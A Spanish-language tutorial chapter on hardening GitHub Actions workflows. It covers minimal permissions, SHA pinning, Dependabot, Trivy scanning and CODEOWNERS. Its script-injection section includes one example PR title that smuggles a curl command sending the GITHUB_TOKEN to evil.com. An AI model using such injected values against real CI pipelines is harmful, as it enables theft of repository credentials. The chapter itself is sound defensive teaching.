# 🔒 Capítulo 10: Seguridad

## 🎯 Objetivos de aprendizaje

- Aplicar el principio de mínimo privilegio con `permissions`
- Proteger la supply chain pinando actions por SHA
- Configurar Dependabot para mantener actions actualizadas
- Escanear vulnerabilidades con Trivy y publicar resultados en GitHub Security

---

## 10.1 Permisos mínimos con permissions

Por defecto, el `GITHUB_TOKEN` puede tener permisos amplios según la configuración del repo. Siempre declarar `permissions` explícitos limita el daño si el workflow es comprometido.

```yaml
# ❌ MAL: sin permissions declarados, usa los defaults del repo
name: CI

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

# ✅ BIEN: permisos mínimos explícitos
name: CI

permissions:
  contents: read  # Solo leer el código

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
```

### Permisos comunes y cuándo usarlos

```yaml
permissions:
  contents: read        # Leer código del repo (casi siempre necesario)
  contents: write       # Crear releases, pushear commits
  packages: read        # Leer imágenes de GHCR
  packages: write       # Pushear imágenes a GHCR
  pull-requests: write  # Comentar en PRs, agregar labels
  issues: write         # Crear/modificar issues
  id-token: write       # OIDC para cloud providers
  security-events: write # Subir resultados de security scan (SARIF)
  actions: read         # Leer workflow runs (para gh CLI en workflows)
```

### Permisos a nivel job (override)

```yaml
permissions:
  contents: read  # Default para todos los jobs

jobs:
  test:
    runs-on: ubuntu-latest
    # Hereda contents: read del workflow
    steps:
      - uses: actions/checkout@v4

  publish:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write  # Solo este job puede pushear a GHCR
    steps:
      - uses: docker/build-push-action@v5
```

## 10.2 Pin actions por SHA (supply chain security)

Cuando usás `uses: actions/checkout@v4`, el tag `v4` puede ser reasignado a un commit diferente. Un atacante que comprometa el repo de la action podría reasignar el tag a código malicioso.

La solución es usar el SHA completo del commit:

```yaml
# ❌ Vulnerable: el tag puede ser reasignado
- uses: actions/checkout@v4
- uses: docker/build-push-action@v5

# ✅ Seguro: el SHA es inmutable
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
- uses: docker/build-push-action@4f58ea79222b3b9dc2c8bbdd6debcef730109a75  # v5.1.0
```

El comentario con la versión es importante para saber qué versión es el SHA.

### Cómo obtener el SHA de una action

```bash
# Ver los commits y tags de una action
gh api repos/actions/checkout/git/refs/tags/v4 --jq '.object.sha'

# O ir a github.com/actions/checkout/releases y copiar el SHA del tag
```

## 10.3 Dependabot para actions

Mantener los SHAs actualizados manualmente es tedioso. Dependabot puede hacerlo automáticamente:

```yaml
# .github/dependabot.yml
version: 2
updates:
  # Actualizar actions de GitHub Actions
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
      day: monday
      time: '09:00'
    # Agrupar todas las actualizaciones en un solo PR
    groups:
      github-actions:
        patterns:
          - '*'
```

Dependabot abrirá PRs automáticamente cuando haya nuevas versiones de las actions que usás.

## 10.4 Security scan con Trivy

Trivy es un escáner de vulnerabilidades open source que puede analizar:
- Sistemas de archivos (dependencias npm, pip, etc.)
- Imágenes Docker
- Archivos de IaC (Terraform, Kubernetes)

```yaml
# .github/workflows/security-scan.yml
name: Security Scan — My Ecommerce

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 6 * * 1'  # Lunes a las 6 AM

permissions:
  contents: read
  security-events: write  # Para subir resultados SARIF

jobs:
  scan-filesystem:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4

      - name: Escanear filesystem del backend
        uses: aquasecurity/trivy-action@6e7b7d1fd3e4fef0c5fa8cce1229c54b2c9bd0d8  # 0.24.0
        with:
          scan-type: 'fs'
          scan-ref: './backend'
          format: 'sarif'
          output: 'trivy-results.sarif'
          severity: 'CRITICAL,HIGH'

      - name: Subir resultados a GitHub Security
        uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: 'trivy-results.sarif'

  scan-docker:
    runs-on: ubuntu-latest
    if: github.event_name != 'pull_request'
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4

      - name: Escanear imagen Docker del backend
        uses: aquasecurity/trivy-action@6e7b7d1fd3e4fef0c5fa8cce1229c54b2c9bd0d8  # 0.24.0
        with:
          scan-type: 'image'
          image-ref: 'ghcr.io/org/my-ecommerce-backend:main'
          format: 'sarif'
          output: 'trivy-image-results.sarif'
          severity: 'CRITICAL,HIGH'

      - name: Subir resultados a GitHub Security
        uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: 'trivy-image-results.sarif'
```

Los resultados aparecen en la pestaña **Security** → **Code scanning alerts** del repo.

## 10.5 Evitar script injection

El contexto `github.event` puede contener datos del usuario (título de PR, nombre de branch). Si los usás directamente en un `run:`, un atacante puede inyectar comandos:

```yaml
# ❌ VULNERABLE: el título del PR puede contener código malicioso
- run: echo "PR title: ${{ github.event.pull_request.title }}"
# Si el título es: "fix: update" && curl evil.com/steal?token=$GITHUB_TOKEN

# ✅ SEGURO: usar variable de entorno intermedia
- run: echo "PR title: $PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
# La variable de entorno es tratada como dato, no como código
```

## 10.6 CODEOWNERS para workflows

Para requerir review de personas específicas cuando se modifican los workflows:

```
# .github/CODEOWNERS
# Los workflows requieren review del equipo de DevOps
.github/workflows/   @org/devops-team
.github/actions/     @org/devops-team
```

## Resumen

- Declarar `permissions` mínimos en todos los workflows
- Usar SHAs en lugar de tags para actions críticas
- Dependabot mantiene los SHAs actualizados automáticamente
- Trivy escanea dependencias e imágenes Docker
- SARIF sube resultados a GitHub Security tab
- Variables de entorno intermedias previenen script injection

## Ejercicios

> Ver: [ejercicios/10-seguridad-ejercicios.md](ejercicios/10-seguridad-ejercicios.md)

## Lectura adicional

- [Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [Trivy action](https://github.com/aquasecurity/trivy-action)
- [Dependabot configuration](https://docs.github.com/en/code-security/dependabot/dependabot-version-updates/configuration-options-for-the-dependabot.yml-file)
